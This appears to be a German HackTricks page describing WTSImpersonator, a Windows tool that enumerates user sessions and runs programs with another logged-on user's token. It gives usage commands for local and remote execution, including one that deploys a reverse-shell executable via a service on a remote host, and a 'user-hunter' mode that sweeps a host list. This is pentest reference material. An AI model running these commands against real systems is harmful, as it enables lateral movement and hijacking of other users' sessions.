# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator** von Omri Baso verwendet Windows Terminal Services APIs, die über die Named Pipe `\\pipe\LSM_API_service` für RPC verfügbar sind, um angemeldete Sitzungen aufzuzählen und einen Prozess mit dem Token eines ausgewählten Benutzers zu starten. Es unterstützt die lokale Aufzählung und Ausführung sowie Remote-Workflows auf Service-Basis.<sup>[[1]](#references)</sup>

## Kernfunktionalität

Der lokale Ausführungsablauf verwendet die folgende API-Sequenz:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Module und Verwendung

- **Benutzer enumerieren:** Das Tool kann Sitzungen auf dem lokalen oder einem Remote-Host enumerieren.

- Lokal:
```bash
.\WTSImpersonator.exe -m enum
```
- Remote, unter Angabe einer IP-Adresse oder eines Hostnamens:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Befehle ausführen:** Die Module `exec` und `exec-remote` benötigen einen Service-Kontext. Microsoft dokumentiert, dass `WTSQueryUserToken` voraussetzt, dass der Aufrufer als `LocalSystem` mit dem Privileg `SE_TCB_NAME` ausgeführt wird.<sup>[[2]](#references)</sup>

- Lokale Befehlsausführung:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec kann zu Testzwecken eine `LocalSystem`-Eingabeaufforderung starten:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote-Befehlsausführung:** Der Remote-Modus erstellt im Rahmen eines PsExec-ähnlichen Workflows einen Service auf dem Zielsystem und benötigt daher die Berechtigungen, diesen Service zu installieren und zu starten.<sup>[[1]](#references)</sup>

- Beispiel:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Benutzer suchen:** Das Modul `user-hunter` durchsucht eine Hostliste nach der Sitzung eines bestimmten Benutzers und versucht, das angegebene Programm in diesem Kontext auszuführen.<sup>[[1]](#references)</sup>
- Anwendungsbeispiel:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: Funktion `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
